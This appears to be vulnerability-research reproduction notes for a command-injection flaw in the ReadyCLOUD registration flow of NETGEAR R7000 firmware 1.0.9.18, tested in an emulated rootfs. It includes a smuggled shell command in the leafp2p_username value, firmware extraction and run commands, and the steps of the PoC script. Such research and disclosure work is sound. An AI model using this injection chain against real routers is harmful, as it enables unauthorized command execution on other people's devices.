# PoC and Reproduction Notes

## Scope

This reproduction is for a local authorized firmware-emulation environment only. It should not be used against public systems or devices without permission.

Target:

```text
NETGEAR R7000 V1.0.9.18_1.2.27
ReadyCLOUD registration flow
```

Payload modeled as polluted persistent state:

```text
leafp2p_username = routeruser; /bin/touch /tmp/pwned; #
```

Expected result:

```text
/tmp/pwned is created inside the emulated rootfs
```

## Prepared Files

Reproduction script:

```text
verify_netgear_readycloud_leafp2p_to_comm_rce.sh
```

Evidence outputs:

```text
evidence_leafp2p_to_comm_rce.txt
evidence_leafp2p_to_comm_rce_rerun_1.txt
evidence_leafp2p_to_comm_rce_rerun_2.txt
```

Static evidence:

```text
static_comm_sh_numbered.txt
static_readycloud_control_strings.txt
```

## Firmware Extraction

In the Docker environment used during verification:

```sh
rm -rf /tmp/r7000_extract
mkdir -p /tmp/r7000_extract
cd /tmp/r7000_extract
binwalk -e /root/inout/firmware/images/netgear/R7000-V1.0.9.18_1.2.27.chk
```

The extracted rootfs path was:

```text
/tmp/r7000_extract/_R7000-V1.0.9.18_1.2.27.chk.extracted/squashfs-root
```

## Reproduction Command

```sh
ORIG=/tmp/r7000_extract/_R7000-V1.0.9.18_1.2.27.chk.extracted/squashfs-root \
WORK=/tmp/netgear_readycloud_comm_rce_rerun_1 \
bash /root/scripts/verify_netgear_readycloud_leafp2p_to_comm_rce.sh
```

The script prints the generated evidence path, for example:

```text
/tmp/netgear_readycloud_comm_rce_rerun_1/leafp2p_to_comm_rce_evidence.txt
```

## PoC Logic Summary

The script:

1. Builds a minimal ARM `libnvram.so` shim compatible with the firmware uClibc loader.
2. Returns required ReadyCLOUD path keys:
   - `rcagent_path=/opt/rcagent`
   - `leafp2p_path=/opt/leafp2p`
   - `remote_path=/opt/remote`
   - `readycloud_control_path=/opt/broken`
3. Returns the malicious `leafp2p_username`.
4. Logs NVRAM reads and writes.
5. Invokes `readycloud_control.cgi` with:

```json
{"id":"readycloud","state":"1","owner":"alice@example.com","password":"plainpass"}
```

6. Allows original `register.sh` and `comm.sh` to execute.
7. Verifies `/tmp/pwned`.

## Success Criteria

The exploit chain is considered reproduced when all of the following are present:

```text
Using routeruser; /bin/touch /tmp/pwned; # as device username
readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #
curl --basic -k --user routeruser
[pwned]
-rw-r--r-- ... /tmp/pwned
```

## Limitations

The PoC models polluted persistent configuration state. It does not prove the upstream external write primitive for `leafp2p_username`. A future full exploit should identify and verify the HTTP/API/LeafP2P path that writes that key.

